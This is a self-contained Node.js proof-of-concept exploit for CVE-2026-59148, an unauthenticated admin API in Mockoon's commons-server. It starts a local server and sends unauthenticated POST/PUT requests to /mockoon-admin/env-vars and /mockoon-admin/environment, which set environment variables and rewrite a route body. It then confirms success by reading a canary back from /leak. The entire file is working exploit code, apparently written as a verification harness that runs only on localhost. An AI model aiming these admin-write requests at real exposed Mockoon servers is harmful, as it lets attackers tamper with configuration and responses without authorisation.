/*
 * PoC for CVE-2026-59148 — Mockoon @mockoon/commons-server unauthenticated admin API.
 *
 * Vulnerable (<9.7.0): the admin API is mounted on the same Express listener as the
 * mock routes, unauthenticated, permissive CORS, write methods enabled. We exercise two
 * independent write primitives; either proves the bug, and BOTH surface the canary only
 * as a consequence of an accepted unauthenticated admin write:
 *
 *   Primitive A — POST /mockoon-admin/env-vars: writes a process env var whose VALUE is
 *   the canary (we, the attacker, choose the value; it only ever reaches stdout if the
 *   write is accepted and the mock route can read it back). We inject several key
 *   variants and the mock route template reads several candidate names, so we connect
 *   regardless of how the endpoint prefixes keys or how getEnvVar resolves them. We
 *   deliberately never read the real 'POC_CANARY' env var name via a template, so an
 *   empty/blocked build cannot leak it.
 *
 *   Primitive B — PUT /mockoon-admin/environment: rewrites the 'leak' route body to a
 *   STATIC canary string (no template helper, so no prefix pitfalls). On the vulnerable
 *   build the hot-reloaded route then returns the canary verbatim.
 *
 * Patched (>=9.7.0): every /mockoon-admin/* write is rejected (404). The env var is
 * never set and the route body is never rewritten, so /leak stays empty and the canary
 * is never produced. The differential holds: the token can appear in an HTTP body only
 * downstream of an accepted unauthenticated admin write.
 *
 * Offline, no args. The canary is emitted only after being observed inside an
 * exploit-produced HTTP response body.
 */

const http = require('http');
const net = require('net');

const commonsServer = require('@mockoon/commons-server');
const MockoonServer =
  commonsServer.MockoonServer || commonsServer.default?.MockoonServer;

const HOST = '127.0.0.1';
const CANARY = process.env.POC_CANARY || '';

// Unique base name; NOTE: never 'POC_CANARY', so no template ever reads the real token.
const BASE = 'POCECHO';

function log(...a) {
  try { process.stderr.write('[poc] ' + a.join(' ') + '\n'); } catch (e) {}
}

function getFreePort() {
  return new Promise((resolve, reject) => {
    const srv = net.createServer();
    srv.on('error', reject);
    srv.listen(0, HOST, () => {
      const port = srv.address().port;
      srv.close(() => resolve(port));
    });
  });
}

function request(method, port, path, bodyObj) {
  return new Promise((resolve) => {
    const data = bodyObj === undefined ? null : JSON.stringify(bodyObj);
    const req = http.request(
      {
        host: HOST,
        port,
        path,
        method,
        headers: data
          ? { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
          : {}
      },
      (res) => {
        let chunks = '';
        res.on('data', (c) => (chunks += c));
        res.on('end', () => resolve({ status: res.statusCode, body: chunks }));
      }
    );
    req.on('error', () => resolve({ status: 0, body: '' }));
    if (data) req.write(data);
    req.end();
  });
}

const delay = (ms) => new Promise((r) => setTimeout(r, ms));

function makeResponse(bodyTemplate, disableTemplating) {
  return {
    uuid: 'resp-uuid-1',
    body: bodyTemplate,
    latency: 0,
    statusCode: 200,
    label: '',
    headers: [{ key: 'Content-Type', value: 'text/plain' }],
    bodyType: 'INLINE',
    filePath: '',
    databucketID: '',
    sendFileAsBody: false,
    rules: [],
    rulesOperator: 'OR',
    disableTemplating: !!disableTemplating,
    fallbackTo404: false,
    default: true,
    crudKey: 'id',
    callbacks: []
  };
}

function buildEnvironment(port, bodyTemplate, disableTemplating) {
  const route = {
    uuid: 'route-uuid-1',
    type: 'http',
    documentation: '',
    method: 'get',
    endpoint: 'leak',
    responses: [makeResponse(bodyTemplate, disableTemplating)],
    responseMode: null,
    streamingMode: null,
    streamingInterval: 0
  };
  return {
    uuid: 'env-uuid-1',
    name: 'poc',
    endpointPrefix: '',
    latency: 0,
    port,
    hostname: '',
    routes: [route],
    rootChildren: [{ type: 'route', uuid: 'route-uuid-1' }],
    folders: [],
    proxyMode: false,
    proxyHost: '',
    proxyRemovePrefix: false,
    proxyReqHeaders: [],
    proxyResHeaders: [],
    tlsOptions: {
      enabled: false,
      type: 'CERT',
      pfxPath: '',
      certPath: '',
      keyPath: '',
      caPath: '',
      passphrase: ''
    },
    cors: true,
    headers: [],
    data: [],
    callbacks: []
  };
}

// Template reads many candidate names to cover every prefix/prepend behavior of both
// the admin env-vars endpoint (write side) and the getEnvVar helper (read side).
// It never references the real 'POC_CANARY' name, so nothing leaks without a write.
function readTemplate() {
  const names = [
    BASE,
    'MOCKOON_' + BASE,
    'MOCKOON_MOCKOON_' + BASE
  ];
  return names.map((n) => `{{getEnvVar '${n}'}}`).join('');
}

async function startServer(server) {
  await new Promise((resolve) => {
    let done = false;
    const finish = () => { if (!done) { done = true; resolve(); } };
    server.on('started', finish);
    server.on('error', (e) => { log('server error', String(e && e.message)); finish(); });
    try { server.start(); } catch (e) { log('start threw', String(e)); finish(); }
    setTimeout(finish, 5000);
  });
}

async function pollLeak(port, contains, tries) {
  for (let i = 0; i < tries; i++) {
    const res = await request('GET', port, '/leak');
    if (res.body && res.body.indexOf(contains) !== -1) return res.body;
    await delay(100);
  }
  return null;
}

async function main() {
  if (typeof MockoonServer !== 'function' || !CANARY) {
    log('missing MockoonServer or POC_CANARY');
    return;
  }

  const port = await getFreePort();

  // Start with a route whose body reads (currently unset) candidate env vars.
  const environment = buildEnvironment(port, readTemplate(), false);

  // envVarsPrefix:'' may or may not be honored by this build; if honored it broadens
  // reads, if not it is harmless. The differential never depends on it.
  const server = new MockoonServer(environment, {
    enableAdminApi: true,
    envVarsPrefix: ''
  });

  await startServer(server);

  // Baseline: template reads unset vars -> empty on BOTH builds.
  const base = await request('GET', port, '/leak');
  log('baseline /leak status', base.status, 'len', base.body.length);

  // ---- Primitive A: unauthenticated arbitrary env-var write. -------------------------
  // Inject the canary VALUE under several key spellings. Whichever spelling/prefix the
  // endpoint uses to store it, one of the template's getEnvVar reads will resolve it.
  const keys = [BASE, 'MOCKOON_' + BASE];
  for (const k of keys) {
    for (const m of ['POST', 'PUT']) {
      const r = await request(m, port, '/mockoon-admin/env-vars', { key: k, value: CANARY });
      log('env-vars', m, k, 'status', r.status);
    }
  }

  let leaked = await pollLeak(port, CANARY, 25);
  if (leaked) {
    log('primitive A succeeded');
    console.log(CANARY);
    try { server.stop(); } catch (e) {}
    process.exit(0);
  }

  // ---- Primitive B: unauthenticated route-body rewrite (static, no template). --------
  const rewritten = buildEnvironment(port, CANARY, true);
  const rw = await request('PUT', port, '/mockoon-admin/environment', rewritten);
  log('env rewrite PUT status', rw.status);

  leaked = await pollLeak(port, CANARY, 40);
  if (leaked) {
    log('primitive B succeeded');
    console.log(CANARY);
    try { server.stop(); } catch (e) {}
    process.exit(0);
  }

  log('no leak — admin writes did not take effect');
  try { server.stop(); } catch (e) {}
  process.exit(0);
}

main().catch((e) => { log('fatal', String(e)); process.exit(0); });